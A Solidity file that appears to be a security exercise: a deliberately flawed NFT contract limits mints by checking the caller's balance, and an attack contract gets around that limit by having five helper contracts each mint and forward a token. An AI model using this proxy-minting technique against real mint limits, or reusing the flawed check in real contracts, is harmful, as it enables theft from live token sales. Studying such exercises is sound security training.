// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract PwnOvermint2 {
    Overmint2 overmint;
    HelperPwnOvermint2 helperPwnOvermint;

    address i_owner;

    constructor(address _overmint) {
        i_owner = msg.sender;
        overmint = Overmint2(_overmint);
    }

    function attack() external {
        require(i_owner == msg.sender, "You are not the Owner!");

        // Create proxy attackers and have them mint
        for (uint i = 0; i < 5; i++) {
            helperPwnOvermint = new HelperPwnOvermint2(
                address(overmint),
                address(this)
            );
            helperPwnOvermint.mintAndTransfer();
        }
    }
}

contract HelperPwnOvermint2 {
    Overmint2 overmint;
    PwnOvermint2 pwnOvermint;

    constructor(address _overmint, address _pwnOvermint) {
        overmint = Overmint2(_overmint);
        pwnOvermint = PwnOvermint2(_pwnOvermint);
    }

    function mintAndTransfer() external {
        // Mint 1 NFT
        overmint.mint();

        // Transfer to PwnOvermint
        uint256 tokenId = overmint.totalSupply();
        overmint.transferFrom(address(this), address(pwnOvermint), tokenId);
    }
}
